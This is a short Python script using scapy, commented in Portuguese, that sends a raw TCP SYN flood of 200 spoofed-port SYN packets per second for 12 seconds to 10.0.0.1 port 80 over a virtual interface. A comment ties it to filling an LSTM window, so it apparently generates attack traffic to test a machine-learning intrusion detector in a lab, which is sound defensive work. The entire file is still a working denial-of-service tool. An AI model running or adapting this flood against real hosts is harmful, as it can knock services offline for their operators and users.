import sys
import time
from scapy.all import IP, TCP, Ether, sendp

def main():
    target_ip = "10.0.0.1"
    target_port = 80
    
    print(f"=== INICIANDO ATAQUE REAL (RAW TCP SYN FLOOD) ===")
    print(f"Alvo: {target_ip}:{target_port}")
    
    # Enviar pacotes continuamente por 12 segundos para encher a janela LSTM
    for sec in range(12):
        print(f"Segundo {sec+1}/12 - Enviando rajada de 200 SYNs brutos...")
        packets = []
        for i in range(200):
            sport = 1024 + (i + sec * 200) % 64000
            pkt = Ether(src="be:ae:24:7a:55:e9", dst="0a:4b:a6:e9:f6:54") / IP(src="10.0.0.2", dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")
            packets.append(pkt)
        
        # Envia pela interface veth1 no nivel de enlace (L2)
        sendp(packets, iface="veth1", verbose=False)
        time.sleep(1.0)
        
    print("Ataque concluído.")

if __name__ == "__main__":
    main()
